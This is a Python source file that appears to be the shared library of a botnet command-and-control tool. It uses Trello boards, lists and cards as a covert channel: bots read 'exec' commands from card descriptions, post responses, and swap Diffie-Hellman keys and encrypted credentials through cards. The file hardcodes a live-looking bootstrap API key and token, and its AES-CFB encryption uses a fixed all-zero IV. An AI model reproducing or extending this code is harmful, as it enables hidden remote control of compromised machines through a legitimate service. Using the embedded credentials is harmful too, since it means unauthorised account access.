import requests
import json
import time
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.asymmetric import dh
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
from cryptography.hazmat.primitives.serialization import PublicFormat
from cryptography.hazmat.primitives.serialization import Encoding
from cryptography.hazmat.primitives.serialization import load_pem_public_key
import base64

# maybe erase bootstrap
BOOTSTRAP_TOKEN = '0371b95aaa9e16d0089fa4d55d078f5fab508c5af7e2d82a7c57aa6be908778b'
BOOTSTRAP_KEY = '0e0a04d5f73b65a679a0b49f2f62df9a'
BOOTSTRAP_BOARD_ID = '639637edc1f14f01dd74eff6'
BOOTSTRAP_LIST_NAME_PREFIX = 'new_creds_'
BOT_BOARD_NAME = 'command_and_control'
BOT_LIST_NAME = 'commands'
TRELLO_URL = 'https://api.trello.com/1/'
SUCCESS = 200
CRED_EXCH_SERVER_NAME = 'server public'
CRED_EXCH_BOT_NAME = 'bot public'
CRED_ANS_CARD_NAME = 'new creds'
CRED_REQ_CARD_NAME = 'request for new account'
KEY_TOKEN_SEPERATOR = ':'
COMMAND_TOKEN_SEPERATOR = ':'
COMMAND_REQ_NAME = "exec"
COMMAND_RESP_NAME = "resp"
TODO_LIST_NAME = "To Do"
DONE_LIST_NAME = "Done"

HTTP_ERROR = -1
INVALID_CREDENTIALS = -2
NOT_FOUND = -3
BOOTSTRAP_ERROR = -4

# The following parameters are used for the DH key exchange
# The prime number
p = 29739679543180524160021835543604539821811579405405583199405505326297620271484751480338037187027684595911229607038485819081286477097448632828504536935394825409449842628083332063130996649777224854811107574001396505771951354034946651162140577581354146386552642546875549771853233622743781203464439309008843343967571040084387433256394222088618262706531100968939446626355269412353139634643601431673464249997409799127539594414900602280217364145967192168101605187105301666520557939370021569004809862785353023069541918338921997446202874565302679741991840117391873037497978777538749325971146550086939289461425803458409792355343
# The generator value
g = 2


def subtract_lists(list1, list2):
    result = []
    for d in list1:
        if d not in list2:
            result.append(d)
    return result


def add_lists(list1, list2):
    result = list1.copy()
    for d in list2:
        if d not in list1:
            result.append(d)
    return result


def check_response(response, err_message):
    if response.status_code != SUCCESS:
        print(err_message)
        print("status code is " + str(response.status_code))
        print(response.text)
        return HTTP_ERROR
    return 0

# request type is "GET"\"POST"
# function returns the response


def send_request(key, token, request_type, url_details, query_parameters={}, request_parameters={}):
    url = TRELLO_URL + url_details
    query = {
        'key': key,
        'token': token
    }
    query.update(query_parameters)
    response = requests.request(
        request_type,
        url,
        params=query,
        **request_parameters  # fishy
    )
    return response


def create_list(key, token, list_name, board_id):
    url_details = '/lists'
    query_parameters = {
        'name': list_name,
        'idBoard': board_id
    }
    response = send_request(key, token, 'POST', url_details, query_parameters)
    if (check_response(response, "ERROR: failed to create list. name = " + list_name) < 0):
        return HTTP_ERROR
    return 0


def create_board(key, token, board_name):
    url_details = '/boards/'
    query_parameters = {
        'name': board_name
    }
    response = send_request(
        key, token, 'POST', url_details=url_details, query_parameters=query_parameters)
    if (check_response(response, "ERROR: failed to create board. name = " + board_name) < 0):
        return HTTP_ERROR
    return 0


def create_card(key, token, list_id, name, desc=""):
    url_details = '/cards/'
    query_parameters = {
        'name': name,
        'idList': list_id
    }
    if desc != "":
        query_parameters['desc'] = desc
    response = send_request(
        key, token, 'POST', url_details=url_details, query_parameters=query_parameters)
    if (check_response(response, "ERROR: failed to create card. name = " + name) < 0):
        return HTTP_ERROR
    return 0


def get_all_boards(key, token):
    url_details = 'members/me/boards/'
    headers = {
        "Accept": "application/json"
    }
    response = send_request(key, token, 'GET', url_details,
                            request_parameters={'headers': headers})
    if (check_response(response, "ERROR: failed to get all boards") < 0):
        return []
    return json.loads(response.text)


def get_board(key, token, board_id):
    url_details = '/boards/' + board_id
    headers = {
        "Accept": "application/json"
    }
    response = send_request(key, token, 'GET', url_details,
                            request_parameters={'headers': headers})
    if (check_response(response, "ERROR: failed to get board. id = " + board_id) < 0):
        return None
    return json.loads(response.text)


def get_list(key, token, list_id):
    url_details = '/lists/' + list_id
    response = send_request(key, token, 'GET', url_details)
    if (check_response(response, "ERROR: failed to get list. id = " + list_id) < 0):
        return None
    return json.loads(response.text)


def get_card(key, token, card_id):
    url_details = '/cards/' + card_id
    response = send_request(key, token, 'GET', url_details)
    if (check_response(response, "ERROR: failed to get card. id = " + card_id) < 0):
        return None
    return json.loads(response.text)


def get_cards_in_list(key, token, list_id):
    url_details = '/lists/' + list_id + '/cards'
    headers = {
        "Accept": "application/json"
    }
    response = send_request(key, token, 'GET', url_details,
                            request_parameters={'headers': headers})
    if (check_response(response, "ERROR: failed to get cards in list. list id = " + list_id) < 0):
        return []
    return json.loads(response.text)


def get_lists_in_board(key, token, board_id):
    url_details = '/boards/' + board_id + '/lists'
    headers = {
        "Accept": "application/json"
    }
    response = send_request(key, token, 'GET', url_details,
                            request_parameters={'headers': headers})
    if (check_response(response, "ERROR: failed to get lists in board. board id = " + board_id) < 0):
        return []
    return json.loads(response.text)


def get_command_from_card(key, token, card_id):
    card = get_card(key, token, card_id)
    if not card:
        return ""
    desc = card['desc']
    return desc


def encrypt(key, data):
    data_bytes = bytes(data, 'utf-8')
    cipher = Cipher(algorithms.AES(key), modes.CFB(
        b'\x00'*16), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_message = encryptor.update(data_bytes) + encryptor.finalize()
    base64_bytes = base64.b64encode(encrypted_message)
    return base64_bytes


def decrypt(key, data):
    data_bytes = base64.b64decode(data)
    cipher = Cipher(algorithms.AES(key), modes.CFB(
        b'\x00'*16), backend=default_backend())
    decryptor = cipher.decryptor()
    decrypted_message = decryptor.update(data_bytes) + decryptor.finalize()
    decrypted_message_str = str(decrypted_message, 'utf-8')
    return decrypted_message_str


def get_creds_from_card(key, token, card_id, encryption_key):
    encrypted_desc = get_command_from_card(key, token, card_id)
    if not encrypted_desc:
        return '', ''
    desc = decrypt(encryption_key, encrypted_desc)
    if not desc or KEY_TOKEN_SEPERATOR not in desc:
        return '', ''
    desc_sep = desc.split(KEY_TOKEN_SEPERATOR)
    return desc_sep[0], desc_sep[1]


def archive_list(key, token, list_id):
    url_details = '/lists/' + list_id + '/closed'
    response = send_request(key, token, 'PUT', url_details)
    if (check_response(response, "ERROR: failed to archive list. id = " + list_id) < 0):
        return HTTP_ERROR
    return 0


def get_board_id(key, token, board_name):
    boards = get_all_boards(key, token)
    if not boards:
        return ''
    for board in boards:
        if board['name'] == board_name:
            return board['id']
    return ''


def get_list_id(key, token, list_name, board_id):
    lists = get_lists_in_board(key, token, board_id)
    if not lists:
        return ''
    for list in lists:
        if list['name'] == list_name:
            return list['id']
    return ''


def get_card_id(key, token, card_name, list_id):
    cards = get_cards_in_list(key, token, list_id)
    if not cards:
        return ''
    for card in cards:
        if card['name'] == card_name:
            return card['id']
    return ''


def create_board_and_get_id(key, token, board_name):
    if create_board(key, token, board_name) < 0:
        return ''
    return get_board_id(key, token, board_name)


def create_list_and_get_id(key, token, list_name, board_id):
    if create_list(key, token, list_name, board_id) < 0:
        return ''
    return get_list_id(key, token, list_name, board_id)


def create_card_and_get_id(key, token, card_name, list_id):
    if create_card(key, token, list_id, card_name) < 0:
        return ''
    return get_card_id(key, token, card_name, list_id)


def delete_board(key, token, board_id):
    url_details = '/boards/' + board_id
    response = send_request(key, token, 'DELETE', url_details)
    if (check_response(response, "ERROR: failed to delete board. id = " + board_id) < 0):
        return HTTP_ERROR
    return 0


def get_DH_parameters():
    parameters = dh.DHParameterNumbers(p=p, g=g)
    return parameters.parameters()


def exchange_keys(key, token, list_id, is_server=False):
    # generate private and public key
    parameters = get_DH_parameters()
    private_key = parameters.generate_private_key()
    public_key = private_key.public_key()
    public_key_bytes = public_key.public_bytes(
        encoding=Encoding.PEM, format=PublicFormat.SubjectPublicKeyInfo)
    other_public_key_bytes = None
    if is_server:
        my_card_name = CRED_EXCH_SERVER_NAME
        other_card_name = CRED_EXCH_BOT_NAME
    else:
        my_card_name = CRED_EXCH_BOT_NAME
        other_card_name = CRED_EXCH_SERVER_NAME
    # send public key to bootstrap
    if create_card(key, token, list_id, my_card_name, public_key_bytes) < 0:
        print("ERROR: could not post public key.")

    # wait for public key from bootstrap
    while True:
        cards = get_cards_in_list(key, token, list_id)
        if len(cards) == 0:
            print("ERROR: could not get cards in list")
            return None
        for card in cards:
            if card['name'] == other_card_name:
                other_public_key_bytes = card['desc']
                if not other_public_key_bytes:
                    print("ERROR: invalid public key received. looking for new...")
                    continue
                break
        if other_public_key_bytes:
            break
        time.sleep(10)

    if not other_public_key_bytes:
        print("ERROR: could not get public key.")
        return None
    # generate shared secret
    other_public_key = load_pem_public_key(
        bytes(other_public_key_bytes, 'utf-8'))
    shared_key = private_key.exchange(other_public_key)
    # derive key from shared secret
    derived_key = HKDF(algorithm=hashes.SHA256(), length=32,
                       salt=None, info=b'handshake data').derive(shared_key)
    return derived_key


# def move_card_to_list(key, token, card_id, list_id):
#     url_details = '/cards/' + card_id + '/idList'
#     response = send_request(key, token, 'PUT', url_details, query_parameters={'value': list_id})
#     if (check_response(response, "ERROR: failed to move card to list. card id = " + card_id + ", list id = " + list_id) < 0):
#         return HTTP_ERROR
#     return 0
